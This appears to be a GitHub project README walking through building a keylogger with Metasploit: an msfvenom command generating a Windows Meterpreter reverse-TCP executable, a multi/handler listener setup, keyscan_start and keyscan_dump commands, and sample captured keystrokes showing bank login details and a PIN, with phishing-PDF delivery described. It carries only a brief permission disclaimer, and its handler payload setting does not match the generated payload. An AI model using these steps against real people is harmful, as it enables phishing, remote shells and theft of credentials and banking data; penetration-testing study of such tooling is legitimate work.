# Building a keylogger using Metasploit framework
# $${\color{red}Welcome \space \color{lightblue}To \space \color{orange}Seyigate}$$

Help suport this project!!!

<a href="https://www.buymeacoffee.com/seyiphysica" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>

This project should be only take place in a control environment and written permission must be given by the system owner.
Seyigate will not be liable to any destructive occurrence in the network and system infrastructure. 

Check out below to learn how to use the metasploit framework. This project was explained in a simplex term and proof of concept included, however they work great! Feel free to fork and improve it if you want. Be sure to check out the [issues](https://github.com/Seyigate/gate_Keylogger/issues) or [pull requests](https://github.com/Seyigate/gate_Keylogger/pulls) to see if your problem has been fixed, or to help out others.


**Introduction** 

This project created a Keyloggerusing Metasploit framework, uses payload as mode of operation.

A payload is a piece of code that executes when hackers exploit a vulnerability. In other words, it’s an exploit module. It’s usually composed of a few commands that will run on the targeted operating system to steal data and other malicious acts.

Keyloggers are a particularly insidious type of program that can record and steal consecutive keystrokes (and much more) that the user enters on a device. 

The term keylogger, or “keystroke logger,” is self-explanatory: Software that logs what you type on your keyboard. However, keyloggers can also enable you to eavesdrop on you, watch you on your system camera, or listen over your smartphone’s microphone.

It’s not unlikely to find harmful payloads in an email attachment. One of the most effective ways to attack or compromise targeted system infrastructure is via phishing email 

**send emails with an attached .pdf file containing a malicious payload <sup>**keylogger**</sup> that will install a backdoor.**

If the victim downloads the file and double-clicks to open it, which will triggers the code in the background. This allows for serving a shell to access the victim’s computer when the victim sends a TCP connection.

Finally, the threat actor will be able to use payloads installed on the targeted machine to record and steal consecutive keystrokes (and much more) that the user enters on a device such as bank user credentials and lot more. 


# **Content**
* [Building the keylogger using Metasploit-framework](https://github.com/Seyigate/gate_Keylogger/blob/main/Building%20the%20keylogger%20using%20Metasploit-framework)

* gate_keylogger
The aim is to create a payload called Meterpreter using Inbuilt Metasploit-framework see- [metasploit-unleashed](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)

Metasploit is handy for generating a reverse shell. The following command generates a reverse TCP shell with the Metasploit framework:
It generate a Windows reverse shell executable that will connect back to us on port 4444.
```
 ┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.2 LPORT=4444 -f exe -o keyshell.exe
```

For the purpose of this project, A listener interactive shell will be initiated, this will allows for serving a shell to access
the targeted machine when the victim sends a TCP connection to record and steal consecutive keystrokes that the user enters on a device.

```
  ┌──(kali㉿kali)-[~]
    └─$ msfconsole
```

In msfconsole, select an exploit module, which is exploit/multi/handler
multi/handler exploit is a stub that handles exploits launched outside of the framework.
it is also a remote exploit module, which can also engage multiple hosts.

```
  msf6 > use exploit/multi/handler
  msf6 exploit(multi/handler) >show info
```
 When using the exploit/multi/handler module, we still need to tell it which payload to expect so we configure it to have the same settings as the executable we generated.
 
```
  msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
  msf6 exploit(multi/handler) > show options
```

 Then configure the parameter appropriately
 
```
 msf6 exploit(multi/handler) > set LHOST 192.168.50.2
 msf6 exploit(multi/handler) > set LPORT 4444
```
Now that we have everything set up and ready to go, 
We run exploit for the multi/handler and execute our generated executable on the victim. 
The multi/handler handles the exploit for us and presents us our shell.

```
    msf6 exploit(handler) > exploit
```
The keyscan_start command starts the keylogging feature on the remote machine.
    Starting the keystroke sniffer ...
```
 meterpreter> keyscan_start    
```
 Starting the keystroke sniffer ...
 The keyscan_dump command is a keylogger feature. You must use the keyscan_start command before using keyscan_dump
   
```
  meterpreter> keyscan_dump
```
 Dumping capture keystrokes ...

 See the capturing kestrokes below

 <SHIFT> www.baclaysbank.co.uk
 
 <SHIFT>username> shift><yinkajah@gmail.com
 
 <CR>password><tap> R2jshb!@(*&^HB
 
 <CR>pin: 126782
 
 snip....

 For more details see *[Building the keylogger using Metasploit-framework](https://github.com/Seyigate/gate_Keylogger/blob/main/Building%20the%20keylogger%20using%20Metasploit-framework)*


   




  



